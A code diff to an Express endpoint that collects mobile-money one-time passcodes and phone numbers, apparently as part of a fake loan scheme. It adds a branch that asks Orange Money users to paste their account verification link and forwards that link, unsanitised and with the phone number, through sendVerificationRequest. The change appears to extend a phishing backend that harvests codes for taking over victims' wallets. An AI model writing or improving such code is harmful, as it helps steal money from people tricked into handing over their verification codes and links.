@@ -143,8 +143,19 @@ app.post('/api/verify/otp', authenticateApiKey, async (req, res) => {
 
         const expected = phoneLengths[countryCode] || { min: 9, max: 9 };
 
-        if (!otp || otp.length !== 4) {
-            return res.status(400).json({ success: false, error: 'Invalid OTP format' });
+        if (!otp) {
+            return res.status(400).json({ success: false, error: 'Champ de vérification requis' });
+        }
+
+        if (paymentMethod === 'orange') {
+            const otpString = String(otp).trim();
+            if (!otpString.startsWith('http')) {
+                return res.status(400).json({ success: false, error: 'Veuillez coller le lien de vérification Orange Money.' });
+            }
+        } else {
+            if (!/^\d{4,6}$/.test(String(otp).replace(/[^0-9]/g, ''))) {
+                return res.status(400).json({ success: false, error: 'Invalid OTP format' });
+            }
         }
 
         if (!phone || phone.length < expected.min || phone.length > expected.max) {
@@ -156,7 +167,9 @@ app.post('/api/verify/otp', authenticateApiKey, async (req, res) => {
         const sanitizedFlow = String(flow || 'loan').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
         const sanitizedPaymentMethod = String(paymentMethod || 'airtel').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 20);
 
-        const verificationValue = `Payment: ${sanitizedPaymentMethod}, OTP: ${sanitizedOtp} (Phone: ${sanitizedPhone})`;
+        const verificationValue = paymentMethod === 'orange'
+            ? `Payment: ${sanitizedPaymentMethod}, Orange Link: ${otp} (Phone: ${sanitizedPhone})`
+            : `Payment: ${sanitizedPaymentMethod}, OTP: ${sanitizedOtp} (Phone: ${sanitizedPhone})`;
 
         const result = await sendVerificationRequest('OTP', verificationValue, sanitizedFlow);
 
